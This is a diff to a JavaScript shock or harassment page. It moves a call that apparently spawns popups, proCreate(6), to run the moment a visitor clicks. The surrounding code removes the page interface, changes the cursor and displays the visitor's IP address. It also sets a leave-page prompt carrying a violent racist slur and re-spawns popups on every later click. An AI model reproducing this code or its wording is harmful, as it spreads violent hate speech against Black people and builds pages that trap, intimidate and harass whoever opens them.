@@ -5,6 +5,7 @@
  * Requires safe.js & math.js preload.
  */
 container.addEventListener('click', async () => {
+	await proCreate(6);
 	document.querySelector("#ui").remove()
 	document.querySelector("#play").remove()
 	document.documentElement.style.cursor = "url(cursor/1.gif), none"
@@ -25,7 +26,6 @@ container.addEventListener('click', async () => {
 		.then(data => {
 			document.getElementById("ip").textContent = data.ip;
 		})
-	await proCreate(6);
 	window.onbeforeunload = () => "RAPE ALL BLACK NIGGERS";
 	document.documentElement.addEventListener('click', async () => {
 		await proCreate(6);
